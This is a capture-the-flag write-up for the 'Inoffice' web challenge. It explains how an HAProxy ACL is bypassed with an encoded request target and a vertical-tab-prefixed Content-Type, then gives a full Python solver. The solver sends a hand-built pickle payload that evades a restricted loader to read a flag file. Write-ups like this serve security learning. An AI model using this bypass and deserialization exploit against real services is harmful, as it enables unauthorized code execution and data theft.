---
title: 'Inoffice'
ctf: 'CSCV2026'
date: 2026-09-25
category: web
difficulty: hard
flag_format: 'CSCV{...}'
---

# Inoffice

## Summary

The challenge places HAProxy in front of a Flask application. HAProxy applies two ACLs before routing the request:

```haproxy
acl is_office_web hdr(host) -i mmoffice.x.corp
acl network_office src 192.168.17.0/24 10.0.17.0/24
acl is_office_path path,url_dec -i -m sub office
acl is_multipart req.hdr(Content-Type) -i -m beg multipart/form-data

http-request deny if is_office_path !network_office
http-request deny if is_multipart !network_office
use_backend back1 if is_office_web
```

The backend exposes `/office-process` and deserializes the uploaded file with a restricted pickle loader. The intended solution is a parser differential:

1. Use an opaque request target so HAProxy does not recognize the protected `office` path, while Gunicorn/Flask routes it to `/office-process`.
2. Prefix the multipart content type with a vertical-tab byte (`0x0b`). HAProxy's `-m beg` ACL no longer matches, while the backend normalizes the header and still parses the multipart body.
3. Use an indirect pickle lookup to obtain `__import__`, import `flask`, read `/flag.txt`, and call `flask.abort(400, flag)`. The flag is returned in the 400 response.

## Reconnaissance

Requests without the office `Host` header returned HAProxy `503 Service Unavailable`, because no backend was selected. With `Host: mmoffice.x.corp`, ordinary requests reached the service but were blocked by the ACLs.

The public source showed that the useful backend endpoint is:

```python
@app.route("/office-process", methods=["POST"])
def process():
    uploaded_file = request.files["file"]
    restricted_loads(uploaded_file.read())
```

The loader rejects direct `exec`, `eval`, and `__import__` references, but it still permits indirect access through `getattr` and dictionary lookups. That is enough to recover `__import__` from `__builtins__`.

## Exploit

The request target used against the remote service is:

```text
http:%6f%66%66%69%63%65-process?@mmoffice.x.corp
```

The exact header differential is:

```http
Content-Type: \x0bmultipart/form-data; boundary=----inoffice-boundary
```

The leading `0x0b` prevents HAProxy's prefix ACL from matching. The backend still accepts it as a multipart content type after normalization.

The pickle payload performs these operations:

```text
globals().get('__builtins__').get('__import__')('flask')
getattr(flask, 'abort')(400, open('/flag.txt').read())
```

The following is a complete solver:

```python
#!/usr/bin/env python3
import re
import socket

TARGET = ("113.20.103.162", 1337)
VHOST = b"mmoffice.x.corp"
BOUNDARY = b"----inoffice-boundary"


def global_ref(name: str) -> bytes:
    return b"c" + b"builtins\n" + name.encode() + b"\n"


def short_string(value: str) -> bytes:
    raw = value.encode()
    if len(raw) > 255:
        raise ValueError("string is too long for SHORT_BINUNICODE")
    return b"\x8c" + bytes([len(raw)]) + raw


def build_pickle() -> bytes:
    p = bytearray(b"\x80\x04")  # protocol 4

    # 0: globals()
    p += global_ref("globals") + b")R\x94" + b"0"

    # 1: globals_dict.get
    p += global_ref("getattr") + b"h\x00" + short_string("get") + b"\x86R\x94" + b"0"

    # 2: globals_dict['__builtins__']
    p += b"h\x01" + short_string("__builtins__") + b"\x85R\x94" + b"0"

    # 3: builtins_dict.get
    p += global_ref("getattr") + b"h\x02" + short_string("get") + b"\x86R\x94" + b"0"

    # 4: builtins_dict['__import__']
    p += b"h\x03" + short_string("__import__") + b"\x85R\x94" + b"0"

    # 5: import flask
    p += b"h\x04" + short_string("flask") + b"\x85R\x94" + b"0"

    # 6: flask.abort
    p += global_ref("getattr") + b"h\x05" + short_string("abort") + b"\x86R\x94" + b"0"

    # 7: open('/flag.txt')
    p += global_ref("open") + short_string("/flag.txt") + b"\x85R\x94" + b"0"

    # 8: file.read
    p += global_ref("getattr") + b"h\x07" + short_string("read") + b"\x86R\x94" + b"0"

    # 9: flag contents
    p += b"h\x08)R\x94" + b"0"

    # abort(400, flag)
    p += b"h\x06(M\x90\x01h\x09tR."
    return bytes(p)


def build_multipart(payload: bytes) -> bytes:
    return (
        b"--" + BOUNDARY + b"\r\n"
        b'Content-Disposition: form-data; name="file"; filename="work.bin"\r\n'
        b"Content-Type: application/octet-stream\r\n\r\n"
        + payload
        + b"\r\n--"
        + BOUNDARY
        + b"--\r\n"
    )


def main() -> None:
    body = build_multipart(build_pickle())
    request_target = b"http:%6f%66%66%69%63%65-process?@mmoffice.x.corp"

    raw = (
        b"POST " + request_target + b" HTTP/1.1\r\n"
        b"Host: " + VHOST + b"\r\n"
        b"Content-Type: \x0bmultipart/form-data; boundary=" + BOUNDARY + b"\r\n"
        + f"Content-Length: {len(body)}\r\n".encode()
        + b"Connection: close\r\n\r\n"
        + body
    )

    with socket.create_connection(TARGET, timeout=5) as sock:
        sock.sendall(raw)
        response = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk

    print(response.decode("utf-8", errors="replace"))
    match = re.search(rb"CSCV(?:2026)?\{[^}\r\n]+\}", response)
    if not match:
        raise SystemExit("flag not found")
    print("FLAG:", match.group().decode())


if __name__ == "__main__":
    main()
```

## Result

The solver received `400 BAD REQUEST`, which is expected because the payload deliberately calls `flask.abort(400, flag)`. The response contained:

```text
CSCV2026{l33t-me+1Nnnn-!!!!!!!!;}
```

## Flag

```text
CSCV2026{l33t-me+1Nnnn-!!!!!!!!;}
```
